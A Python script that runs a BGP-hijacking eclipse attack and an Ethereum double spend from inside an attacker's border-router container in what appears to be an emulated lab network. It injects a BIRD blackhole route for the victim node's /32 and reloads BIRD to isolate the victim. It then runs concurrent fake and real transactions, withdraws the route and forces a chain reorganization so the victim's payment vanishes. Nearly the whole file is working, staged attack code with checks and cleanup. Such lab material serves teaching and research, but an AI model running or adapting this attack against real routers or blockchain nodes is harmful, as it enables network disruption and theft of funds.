#!/usr/bin/env python3
"""
BGP Hijacking Eclipse Attack & Double Spend — runs INSIDE the attacker
border router container (as161brd-router0-10.161.0.254).

Drop this file (and fake_tx.py / real_tx.py) into the container and run:
    python3 bgp_eclipse_attack_container.py

No docker CLI, no host-VM subprocess calls.  BIRD is manipulated directly
with local file I/O + subprocess("birdc configure").  Geth nodes are
reached over HTTP-RPC.

Topology
  Real World:  Node 160 (BootNode Miner)   10.160.0.71
               Node 161 (Miner)             10.161.0.71
  Victim:      Node 162 (Miner)             10.162.0.71
  Attacker:    This container               as161brd-router0-10.161.0.254
"""

import subprocess
import sys
import os
import time
import signal
import argparse
import textwrap
import threading
import urllib.request as _ureq
import json as _json
from datetime import datetime
from web3 import Web3

# ──────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────
BIRD_CONF    = "/etc/bird/bird.conf"
VICTIM_IP    = "10.162.0.71"
AS160_BRD_IP = "10.160.0.254"   # used for route-table verification

RPC = {
    "node160": "http://10.160.0.71:8545",
    "node161": "http://10.161.0.71:8545",
    "node162": "http://10.162.0.71:8545",
}

ADDR_ORIGIN = "0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24"
ADDR_VICTIM = "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9"
ADDR_BOB    = "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"

FAKE_TX_SCRIPT = "./fake_tx.py"
REAL_TX_SCRIPT = "./real_tx.py"

# The BIRD block we inject — a /32 blackhole for the victim's IP
BGP_HIJACK_BLOCK = """
protocol static hijack {
    ipv4 {
        table t_direct;
    };
    route 10.162.0.71/32 blackhole;
}
"""
BGP_HIJACK_MARKER = "protocol static hijack {"

POLL_INTERVAL         = 3
PEER_POLL_TIMEOUT     = 120
BLOCK_ADVANCE_TIMEOUT = 180
REORG_MARGIN          = 5

# ──────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(msg, color=WHITE):
    print(f"{DIM}[{ts()}]{RESET} {color}{msg}{RESET}", flush=True)

def log_phase(n, title):
    bar = "=" * 60
    print(f"\n{CYAN}{BOLD}{bar}{RESET}")
    print(f"{CYAN}{BOLD}  PHASE {n}: {title}{RESET}")
    print(f"{CYAN}{BOLD}{bar}{RESET}\n", flush=True)

def log_ok(msg):
    print(f"{DIM}[{ts()}]{RESET} {GREEN}{BOLD}+  {msg}{RESET}", flush=True)

def log_warn(msg):
    print(f"{DIM}[{ts()}]{RESET} {YELLOW}{BOLD}!  {msg}{RESET}", flush=True)

def log_err(msg):
    print(f"{DIM}[{ts()}]{RESET} {RED}{BOLD}x  {msg}{RESET}", flush=True)

def log_info(msg):
    print(f"{DIM}[{ts()}]{RESET} {CYAN}-> {msg}{RESET}", flush=True)

def log_balances(label, origin, victim, bob):
    print(f"\n  {BOLD}{WHITE}{'-'*50}{RESET}")
    print(f"  {BOLD}{WHITE}Balances [{label}]{RESET}")
    print(f"  {WHITE}Origin  {ADDR_ORIGIN[:12]}...  {CYAN}{BOLD}{origin:.4f} ETH{RESET}")
    print(f"  {WHITE}Victim  {ADDR_VICTIM[:12]}...  {CYAN}{BOLD}{victim:.4f} ETH{RESET}")
    print(f"  {WHITE}Bob     {ADDR_BOB[:12]}...  {CYAN}{BOLD}{bob:.4f} ETH{RESET}")
    print(f"  {BOLD}{WHITE}{'-'*50}{RESET}\n", flush=True)

def abort(msg):
    log_err(f"FATAL: {msg}")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────
# LOCAL SHELL HELPER  (we ARE the container — no docker)
# ──────────────────────────────────────────────────────────────
def run(cmd, check=True, capture=True):
    """Run a shell command locally inside this container."""
    r = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"Command failed [{r.returncode}]: {r.stderr.strip()}")
    return r.stdout.strip() if capture else None

# ──────────────────────────────────────────────────────────────
# WEB3 HELPERS
# ──────────────────────────────────────────────────────────────
def make_w3(node_key):
    return Web3(Web3.HTTPProvider(RPC[node_key]))

def wei_to_eth(v):
    return float(Web3.fromWei(v, "ether"))

def get_balances_eth(w3):
    return (
        wei_to_eth(w3.eth.get_balance(ADDR_ORIGIN)),
        wei_to_eth(w3.eth.get_balance(ADDR_VICTIM)),
        wei_to_eth(w3.eth.get_balance(ADDR_BOB)),
    )

def get_peer_count_rpc(url):
    """Ask a geth node its peer count via net_peerCount JSON-RPC."""
    try:
        body = _json.dumps({
            "jsonrpc": "2.0", "method": "net_peerCount", "params": [], "id": 1
        }).encode()
        req = _ureq.Request(url, data=body,
                            headers={"Content-Type": "application/json"})
        resp = _json.loads(_ureq.urlopen(req, timeout=4).read())
        return int(resp["result"], 16)
    except Exception:
        return -1

# ──────────────────────────────────────────────────────────────
# POLLING UTILITY
# ──────────────────────────────────────────────────────────────
def wait_for(condition_fn, timeout, poll=POLL_INTERVAL, label="condition"):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            result = condition_fn()
            if result:
                return result
        except Exception as e:
            log(f"  poll '{label}' error: {e}", DIM)
        remaining = int(deadline - time.time())
        log(f"  Waiting for {label} ... ({remaining}s left)", DIM)
        time.sleep(poll)
    return None

# ──────────────────────────────────────────────────────────────
# RPC / MINING HELPERS
# ──────────────────────────────────────────────────────────────
def wait_for_rpc(node_key, timeout=120):
    log_info(f"Waiting for RPC on {node_key} ({RPC[node_key]}) ...")
    def check():
        try:
            return make_w3(node_key).isConnected()
        except Exception:
            return False
    if not wait_for(check, timeout, label=f"{node_key} RPC"):
        abort(f"RPC on {node_key} never came up after {timeout}s")
    log_ok(f"RPC on {node_key} is live")
    return make_w3(node_key)

def wait_for_all_mining(nodes, timeout=BLOCK_ADVANCE_TIMEOUT):
    log_info("Snapshotting initial block heights ...")
    initial = {}
    for label, w3 in nodes.items():
        try:
            initial[label] = w3.eth.block_number
        except Exception:
            initial[label] = None
        log(f"  {label}: block {initial[label]}", DIM)

    log_info("Waiting for ALL nodes to advance at least one block ...")
    def all_advanced():
        statuses = {}
        for label, w3 in nodes.items():
            try:
                bn = w3.eth.block_number
                statuses[label] = (initial[label] is not None and bn > initial[label], bn)
            except Exception:
                statuses[label] = (False, "?")
        log("  " + "  ".join(
            f"{l}:{v[1]}({'ok' if v[0] else '...'})" for l, v in statuses.items()
        ), DIM)
        return all(v[0] for v in statuses.values())

    if not wait_for(all_advanced, timeout, label="all nodes mining"):
        abort(f"Not all nodes advanced blocks within {timeout}s")
    log_ok("All nodes are mining!")

def ensure_mining(w3, label="node162"):
    """Verify block advances over 5s; if not, restart miner via geth IPC."""
    log_info(f"Verifying {label} miner is active ...")
    initial = w3.eth.block_number
    time.sleep(5)
    if w3.eth.block_number > initial:
        log_ok(f"  {label} is mining (block advanced)")
        return
    log_warn(f"  {label} block did not advance — attempting miner restart via geth IPC ...")
    # NOTE: this container is the border router, not the node162 container,
    # so we cannot reach its geth IPC socket.  We use the miner_start
    # JSON-RPC method (available when --rpc is enabled on node162).
    try:
        for method, params in [
            ("miner_stop",  []),
            ("miner_start", [1]),
        ]:
            body = _json.dumps({
                "jsonrpc": "2.0", "method": method, "params": params, "id": 1
            }).encode()
            req = _ureq.Request(RPC["node162"], data=body,
                                headers={"Content-Type": "application/json"})
            _ureq.urlopen(req, timeout=5)
        log_ok(f"  miner restart RPC call sent to {label}")
    except Exception as e:
        log_warn(f"  miner restart RPC failed: {e} — check node162 manually")
    time.sleep(6)
    if w3.eth.block_number > initial:
        log_ok(f"  {label} miner restarted successfully")
    else:
        log_warn(f"  {label} still not mining after restart attempt")

# ──────────────────────────────────────────────────────────────
# BIRD HELPERS  (local file I/O — we are inside the router)
# ──────────────────────────────────────────────────────────────
def bird_conf_has_hijack():
    """Return True if our hijack block is already in bird.conf."""
    try:
        with open(BIRD_CONF, "r") as f:
            return BGP_HIJACK_MARKER in f.read()
    except Exception:
        return False

def inject_bgp_hijack():
    """Append the malicious blackhole route block to bird.conf."""
    with open(BIRD_CONF, "a") as f:
        f.write(BGP_HIJACK_BLOCK)

def remove_bgp_hijack():
    """
    Remove the hijack block from bird.conf.
    Deletes the 'protocol static hijack { ... }' block using sed.
    """
    run(f"sed -i '/protocol static hijack/,/^}}/d' {BIRD_CONF}", check=False)

def birdc_configure():
    """Reload BIRD config and return its output."""
    r = subprocess.run(["birdc", "configure"],
                       capture_output=True, text=True)
    out = (r.stdout + r.stderr).strip()
    log(f"  birdc: {out}", DIM)
    return out

def get_route_for_victim():
    """
    Check AS160's routing table via their border router.
    Since we are inside AS161's router (not AS160's), we use 'ip route'
    locally: after our BGP UPDATE propagates, the IX route server will
    redistribute the /32 and our own kernel table won't directly show
    AS160's view.  Instead we query AS160's border router over the IX
    using SSH (if available), or fall back to a best-effort local check.
    """
    # Preferred: ping / traceroute the IX route-server is not guaranteed.
    # Most practical: check our own BIRD routing table for the hijack prefix.
    out = run("birdc show route for 10.162.0.71 all", check=False)
    return out

# ──────────────────────────────────────────────────────────────
# TX SCRIPT RUNNER
# ──────────────────────────────────────────────────────────────
def _stream_script(script_path, label, results):
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["PYTHONWARNINGS"]   = "ignore"
    proc = subprocess.Popen(
        [sys.executable, "-u", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1, env=env
    )
    for line in proc.stdout:
        line = line.rstrip()
        if not line:
            continue
        if line.startswith("[+]"):
            log_ok(f"  [{label}] {line}")
        elif line.startswith("[*]"):
            log_info(f"  [{label}] {line}")
        elif line.startswith("[!]"):
            log_warn(f"  [{label}] {line}")
        else:
            log(f"  [{label}] {line}", DIM)
    proc.wait()
    results[label] = proc.returncode

def run_tx_scripts_concurrently():
    results = {}
    t_fake = threading.Thread(target=_stream_script,
                              args=(FAKE_TX_SCRIPT, "FAKE", results), daemon=True)
    t_real = threading.Thread(target=_stream_script,
                              args=(REAL_TX_SCRIPT, "REAL", results), daemon=True)
    t_fake.start()
    t_real.start()
    t_fake.join()
    t_real.join()
    if results.get("FAKE", 1) != 0:
        abort(f"{FAKE_TX_SCRIPT} exited with code {results.get('FAKE')}")
    if results.get("REAL", 1) != 0:
        abort(f"{REAL_TX_SCRIPT} exited with code {results.get('REAL')}")

# ──────────────────────────────────────────────────────────────
# PHASE 0 — PRE-FLIGHT
# ──────────────────────────────────────────────────────────────
def phase0_preflight():
    log_phase(0, "PRE-FLIGHT CHECKS")

    log_info("Checking required tools ...")
    for tool in ("birdc", "python3", "sed", "ip"):
        try:
            run(f"which {tool}")
            log_ok(f"  {tool}: found")
        except Exception:
            abort(f"Required tool '{tool}' not found in this container")

    log_info("Checking BIRD daemon is running ...")
    out = run("birdc show status", check=False)
    if "BIRD" not in out and "bird" not in out.lower():
        abort("BIRD daemon not responding — is it running?")
    log_ok("BIRD is running")

    log_info("Checking bird.conf is readable/writable ...")
    if not os.access(BIRD_CONF, os.R_OK | os.W_OK):
        abort(f"{BIRD_CONF} is not readable/writable — run as root?")
    log_ok(f"{BIRD_CONF} is accessible")

    log_info("Checking for stale hijack block in bird.conf ...")
    if bird_conf_has_hijack():
        log_warn("Stale hijack block found — cleaning up ...")
        remove_bgp_hijack()
        birdc_configure()
        time.sleep(3)
        if bird_conf_has_hijack():
            abort("Could not remove stale hijack block from bird.conf")
        log_ok("Stale hijack block removed")
    else:
        log_ok("bird.conf is clean")

    log_info("Checking tx scripts exist ...")
    for path in (FAKE_TX_SCRIPT, REAL_TX_SCRIPT):
        if not os.path.isfile(path):
            abort(f"{path} not found — copy it to the same directory as this script")
        log_ok(f"  Found {path}")

    w3_160 = wait_for_rpc("node160")
    w3_161 = wait_for_rpc("node161")
    w3_162 = wait_for_rpc("node162")

    wait_for_all_mining({"node160": w3_160, "node161": w3_161, "node162": w3_162})

    b160 = w3_160.eth.block_number
    b161 = w3_161.eth.block_number
    b162 = w3_162.eth.block_number
    log_info(f"Block heights -- 160: {b160}  161: {b161}  162: {b162}")
    if max(b160, b161, b162) - min(b160, b161, b162) > 10:
        log_warn("Block heights differ by more than 10 — nodes may not be fully synced")
    else:
        log_ok("Block heights look consistent")

    o, v, b = get_balances_eth(w3_160)
    log_balances("Pre-Attack (Node 160)", o, v, b)
    if o < 2.0:
        abort(f"Origin account only has {o:.4f} ETH — need at least 2 ETH")

    peers = get_peer_count_rpc(RPC["node162"])
    log_info(f"Node 162 peer count before attack: {peers}")
    if peers == 0:
        log_warn("Node 162 already has 0 peers — check network")
    else:
        log_ok(f"Node 162 is connected ({peers} peers)")

    log_ok("Pre-flight complete — all systems go\n")
    return w3_160, w3_161, w3_162

# ──────────────────────────────────────────────────────────────
# PHASE 1 — BGP HIJACK ECLIPSE
# ──────────────────────────────────────────────────────────────
def phase1_bgp_eclipse():
    log_phase(1, "BGP HIJACKING ECLIPSE — ISOLATING NODE 162")

    # Show current bird.conf tail
    tail = run(f"tail -20 {BIRD_CONF}", check=False)
    log(f"  Current bird.conf tail:\n{tail}", DIM)

    # Step 1: inject the malicious route
    log_info("Injecting blackhole route for 10.162.0.71/32 into bird.conf ...")
    inject_bgp_hijack()

    if not bird_conf_has_hijack():
        abort("Hijack block was not written to bird.conf — check file permissions")
    log_ok("Malicious route block written to bird.conf")

    # Step 2: reload BIRD to broadcast BGP UPDATE
    log_info("Reloading BIRD config (triggers BGP UPDATE to route server) ...")
    out = birdc_configure()
    if "Reconfigured" in out or "reconfigured" in out:
        log_ok("BIRD reconfigured — BGP UPDATE sent")
    else:
        log_warn(f"Unexpected birdc output: {out.strip()} — continuing anyway")

    # Step 3: verify the route is in our own BIRD table
    log_info("Verifying hijack route in BIRD routing table ...")
    def route_present():
        out = get_route_for_victim()
        log(f"  BIRD route for {VICTIM_IP}: {out.strip()}", DIM)
        return "blackhole" in out.lower() or "hijack" in out.lower() or VICTIM_IP in out
    result = wait_for(route_present, timeout=30, label="BIRD table has hijack route")
    if not result:
        log_warn("Could not confirm hijack in BIRD table — BGP UPDATE may still be propagating")
    else:
        log_ok("Hijack route confirmed in BIRD routing table")

    # Step 4: confirm node 162 loses peers
    log_info("Waiting for Node 162 peer count to reach 0 ...")
    def check_isolated():
        p = get_peer_count_rpc(RPC["node162"])
        log(f"  Node 162 peers: {p}", DIM)
        return p == 0
    result = wait_for(check_isolated, timeout=PEER_POLL_TIMEOUT, label="Node 162 isolated")
    if not result:
        log_warn("Node 162 still has peers — eclipse may be partial (BGP convergence can be slow)")
    else:
        log_ok("Eclipse confirmed! Node 162 has 0 peers — it is ISOLATED via BGP blackhole")

    log_ok("Phase 1 complete — Node 162 is eclipsed at Layer 3\n")

# ──────────────────────────────────────────────────────────────
# PHASE 2 — DOUBLE SPEND
# ──────────────────────────────────────────────────────────────
def phase2_double_spend(w3_160, w3_162):
    log_phase(2, "DOUBLE SPEND — DIVERGING THE CHAINS")

    for path in (FAKE_TX_SCRIPT, REAL_TX_SCRIPT):
        if not os.path.isfile(path):
            abort(f"{path} not found")

    ensure_mining(w3_162, label="node162")

    nonce_real = w3_160.eth.get_transaction_count(ADDR_ORIGIN)
    nonce_fake = w3_162.eth.get_transaction_count(ADDR_ORIGIN)
    log_info(f"Nonce on real chain (node160): {nonce_real}")
    log_info(f"Nonce on fake chain (node162): {nonce_fake}")
    if nonce_real != nonce_fake:
        log_warn(f"Nonces differ ({nonce_real} vs {nonce_fake}) — chains may already be diverged!")
    else:
        log_ok(f"Nonces match ({nonce_real}) — both chains see the same account state")

    log_info("Launching fake_tx.py and real_tx.py concurrently ...")
    run_tx_scripts_concurrently()

    log_info("Fetching balances from both worlds ...")
    o_real, v_real, b_real = get_balances_eth(w3_160)
    o_fake, v_fake, b_fake = get_balances_eth(w3_162)

    log_balances("REAL WORLD (Node 160)", o_real, v_real, b_real)
    log_balances("FAKE WORLD (Node 162)", o_fake, v_fake, b_fake)

    if b_real > 0.9:
        log_ok("Bob received 1 ETH on the real chain")
    else:
        log_warn(f"Bob's real balance: {b_real:.4f} ETH (unexpected)")

    if v_fake > v_real + 4.0:
        log_ok("Victim thinks they received 5 ETH (fake chain) — they are fooled!")
    else:
        log_warn(f"Victim fake balance: {v_fake:.4f} ETH (unexpected)")

    real_block = w3_160.eth.block_number
    fake_block = w3_162.eth.block_number
    log_info(f"Chain lengths -- Real: {real_block}  Fake: {fake_block}")
    if real_block > fake_block:
        log_ok(f"Real chain is longer by {real_block - fake_block} blocks")
    else:
        log_warn("Fake chain is currently longer — real chain needs to catch up before Phase 3")

    log_ok("Phase 2 complete — both realities exist simultaneously\n")
    return real_block, fake_block

# ──────────────────────────────────────────────────────────────
# PHASE 3 — CHAIN REORGANIZATION
# ──────────────────────────────────────────────────────────────
def phase3_reorg(w3_160, w3_162, real_block_at_p2, fake_block_at_p2):
    log_phase(3, "CHAIN REORGANIZATION — THE VANISH")

    log_info(f"Waiting for real chain to lead fake chain by at least {REORG_MARGIN} blocks ...")
    def real_chain_ahead_enough():
        r = w3_160.eth.block_number
        f = w3_162.eth.block_number
        margin = r - f
        log(f"  Real: {r}  Fake: {f}  margin: {margin:+d}  (need +{REORG_MARGIN})", DIM)
        return margin >= REORG_MARGIN
    result = wait_for(real_chain_ahead_enough, timeout=300,
                      label=f"real chain +{REORG_MARGIN} blocks ahead")
    if not result:
        log_warn(f"Real chain never reached +{REORG_MARGIN} margin in 5 min — releasing anyway")
    else:
        margin = w3_160.eth.block_number - w3_162.eth.block_number
        log_ok(f"Real chain is ahead by {margin} blocks — safe to release victim")

    # Remove the malicious route
    log_info("Removing hijack block from bird.conf ...")
    remove_bgp_hijack()
    if bird_conf_has_hijack():
        log_warn("Hijack block may still be present — check bird.conf manually")
    else:
        log_ok("Hijack block removed")

    log_info("Reloading BIRD config (triggers BGP WITHDRAW to route server) ...")
    out = birdc_configure()
    if "Reconfigured" in out or "reconfigured" in out:
        log_ok("BIRD reconfigured — BGP WITHDRAW sent, routes converging")
    else:
        log_warn(f"Unexpected birdc output: {out.strip()}")

    # Verify the blackhole is gone from BIRD's table
    log_info("Waiting for BIRD routing table to clear the blackhole ...")
    def route_cleared():
        out = get_route_for_victim()
        log(f"  BIRD route for {VICTIM_IP}: {out.strip()[:80]}", DIM)
        return "blackhole" not in out.lower()
    result = wait_for(route_cleared, timeout=60, label="BIRD blackhole cleared")
    if not result:
        log_warn("BIRD table may still have the blackhole — BGP convergence in progress")
    else:
        log_ok("BIRD blackhole cleared — BGP WITHDRAW propagated")

    # Push addPeer to node162 via JSON-RPC to speed up reconnection
    log_info("Getting BootNode enode URL ...")
    try:
        body = _json.dumps({
            "jsonrpc": "2.0", "method": "admin_nodeInfo", "params": [], "id": 1
        }).encode()
        req = _ureq.Request(RPC["node160"], data=body,
                            headers={"Content-Type": "application/json"})
        resp = _json.loads(_ureq.urlopen(req, timeout=5).read())
        enode = resp["result"]["enode"].replace("127.0.0.1", "10.160.0.71")
        log_info(f"BootNode enode: {enode[:70]}...")
    except Exception as e:
        log_warn(f"Could not fetch enode: {e}")
        enode = None

    if enode:
        log_info("Calling admin_addPeer on Node 162 via JSON-RPC ...")
        try:
            body = _json.dumps({
                "jsonrpc": "2.0", "method": "admin_addPeer",
                "params": [enode], "id": 1
            }).encode()
            req = _ureq.Request(RPC["node162"], data=body,
                                headers={"Content-Type": "application/json"})
            resp = _json.loads(_ureq.urlopen(req, timeout=5).read())
            if resp.get("result"):
                log_ok("  admin_addPeer accepted")
            else:
                log_warn(f"  admin_addPeer response: {resp}")
        except Exception as e:
            log_warn(f"  admin_addPeer failed: {e} — node may reconnect on its own via BGP recovery")

    log_info("Waiting for Node 162 to reconnect ...")
    def has_peers():
        p = get_peer_count_rpc(RPC["node162"])
        log(f"  Node 162 peers: {p}", DIM)
        return p > 0
    result = wait_for(has_peers, timeout=PEER_POLL_TIMEOUT, label="Node 162 has peers")
    if not result:
        log_warn("Node 162 still has no peers — BGP may still be converging")
    else:
        log_ok("Node 162 reconnected to real network!")

    log_info("Waiting for Node 162 to sync with real chain ...")
    def chains_synced():
        try:
            r = w3_160.eth.block_number
            f = w3_162.eth.block_number
            log(f"  Real: {r}  Victim (162): {f}", DIM)
            return abs(r - f) <= 2
        except Exception:
            return False
    result = wait_for(chains_synced, timeout=180, label="chains synced")
    if not result:
        log_warn("Chains did not fully sync within 3 min — partial reorg possible")
    else:
        log_ok("Node 162 has synced with the real chain — reorg complete!")

    # Final balance check
    log_info("Reading final balances from Node 162 (post-reorg) ...")
    o_post, v_post, b_post = get_balances_eth(w3_162)
    log_balances("POST-REORG (Node 162)", o_post, v_post, b_post)

    o_real_now, v_real_now, b_real_now = get_balances_eth(w3_160)

    print(f"\n  {BOLD}{GREEN}{'='*50}{RESET}")
    print(f"  {BOLD}{GREEN}  DOUBLE SPEND RESULT{RESET}")
    print(f"  {BOLD}{GREEN}{'='*50}{RESET}")
    if b_post > 0.9 or abs(b_post - b_real_now) < 0.1:
        log_ok(f"Bob kept 1 ETH on the real chain ({b_post:.4f} ETH on node162)")
    else:
        log_warn(f"Bob's balance: {b_post:.4f} ETH (unexpected)")
    if abs(v_post - v_real_now) < 0.5:
        log_ok(f"Victim balance on 162 ({v_post:.4f}) matches real chain ({v_real_now:.4f})")
        log_ok("Victim's 5 ETH payment VANISHED after reorg")
    else:
        log_warn(f"Victim on 162: {v_post:.4f} ETH  |  Real chain: {v_real_now:.4f} ETH (may still be syncing)")
    print(f"  {BOLD}{GREEN}{'='*50}{RESET}\n", flush=True)

    log_ok("Phase 3 complete — BGP hijacking eclipse attack and double spend successful!\n")

# ──────────────────────────────────────────────────────────────
# SIGNAL HANDLER — emergency cleanup
# ──────────────────────────────────────────────────────────────
def cleanup_on_interrupt(sig, frame):
    print(f"\n{YELLOW}{BOLD}[!] Interrupted — attempting emergency cleanup ...{RESET}")
    try:
        remove_bgp_hijack()
        birdc_configure()
        print(f"{GREEN}  Hijack route removed and BIRD reloaded{RESET}")
    except Exception as e:
        print(f"{RED}  Cleanup failed: {e}{RESET}")
        print(f"{YELLOW}  Manual fix: remove 'protocol static hijack' block from{RESET}")
        print(f"{YELLOW}  {BIRD_CONF}  and run: birdc configure{RESET}")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="BGP Hijacking Eclipse Attack & Double Spend — run inside attacker border router",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Run from inside container as161brd-router0-10.161.0.254.
            Requires: python3, web3, birdc (BIRD), sed
            Also needs fake_tx.py and real_tx.py in the same directory.
        """)
    )
    parser.add_argument("--skip-reorg", action="store_true",
                        help="Stop after Phase 2 (skip chain reorganization)")
    parser.add_argument("--phase", type=int, choices=[0, 1, 2, 3], default=None,
                        help="Run only up to this phase (0=preflight, 1=eclipse, 2=double-spend, 3=reorg)")
    args = parser.parse_args()

    signal.signal(signal.SIGINT,  cleanup_on_interrupt)
    signal.signal(signal.SIGTERM, cleanup_on_interrupt)

    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  BGP HIJACKING ECLIPSE ATTACK & DOUBLE SPEND{RESET}")
    print(f"{CYAN}{BOLD}  Ethereum PoW Private Emulator  (BGP / Layer 3){RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}\n")
    print(f"  {DIM}Attacker: as161brd-router0-10.161.0.254 (this container){RESET}")
    print(f"  {DIM}Victim:   {VICTIM_IP}{RESET}")
    print(f"  {DIM}Method:   BGP blackhole route  {VICTIM_IP}/32 via BIRD{RESET}\n")

    max_phase = args.phase if args.phase is not None else (2 if args.skip_reorg else 3)

    w3_160, w3_161, w3_162 = phase0_preflight()
    if max_phase == 0:
        log_ok("Stopped after pre-flight (--phase 0)")
        return

    phase1_bgp_eclipse()
    if max_phase == 1:
        log_ok("Stopped after eclipse (--phase 1)")
        log_warn("BGP hijack is ACTIVE — run cleanup or remove hijack block manually")
        return

    real_block, fake_block = phase2_double_spend(w3_160, w3_162)
    if max_phase == 2:
        log_ok("Stopped after double spend (--phase 2 / --skip-reorg)")
        log_warn("BGP hijack is still ACTIVE — run Phase 3 or clean up manually")
        return

    phase3_reorg(w3_160, w3_162, real_block, fake_block)
    print(f"\n{GREEN}{BOLD}  All phases complete.{RESET}\n")


if __name__ == "__main__":
    main()